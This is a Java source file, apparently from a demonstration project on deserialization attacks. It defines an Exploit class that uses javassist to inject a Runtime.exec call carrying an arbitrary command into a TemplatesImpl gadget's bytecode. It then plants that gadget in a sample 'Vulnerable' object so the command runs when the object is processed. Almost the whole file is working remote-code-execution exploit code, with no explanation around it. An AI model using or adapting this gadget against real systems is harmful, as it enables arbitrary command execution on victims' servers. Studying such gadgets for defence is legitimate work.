package com.ttulka.security;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.ttulka.security.sample.Vulnerable;

import javassist.ClassPool;
import javassist.CtClass;

public class Exploit implements Serializable {

    private static final long serialVersionUID = 1L;

    private final String cmd;

    public Exploit(String cmd) {
        this.cmd = cmd;
    }

    public Vulnerable exploited(Vulnerable vulnerable) throws Exception {
        Object exploit = createTemplatesImpl(cmd);
        vulnerable.setObject(exploit);


        setFieldValue(vulnerable, "property", "outputProperties");

        return vulnerable;
    }

    public TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());

        // run command in static initializer
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                     command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                     "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("com.ttulka.Exploit" + System.nanoTime()); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        setFieldValue(templates, "_bytecodes", new byte[][]{
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Exploit");
        setFieldValue(templates, "_tfactory", TransformerFactoryImpl.class.newInstance());
        return templates;
    }

    void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = 1L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    public static class ClassFiles {

        public static byte[] classAsBytes(final Class<?> clazz) {
            try {
                byte[] buffer = new byte[1024];
                String classFilename = filenameForClass(clazz, true);
                try (InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(classFilename)) {
                    if (in == null) {
                        throw new IOException("couldn't find '" + classFilename + "'");
                    }
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    int len;
                    while ((len = in.read(buffer)) != -1) {
                        out.write(buffer, 0, len);
                    }
                    return out.toByteArray();
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        private static String filenameForClass(final Class<?> clazz, boolean suffix) {
            String str;
            if (clazz.getEnclosingClass() == null) {
                str = clazz.getName().replace(".", "/");
            } else {
                str = filenameForClass(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
            }
            if (suffix) {
                str += ".class";
            }
            return str;
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 1L;
    }

}
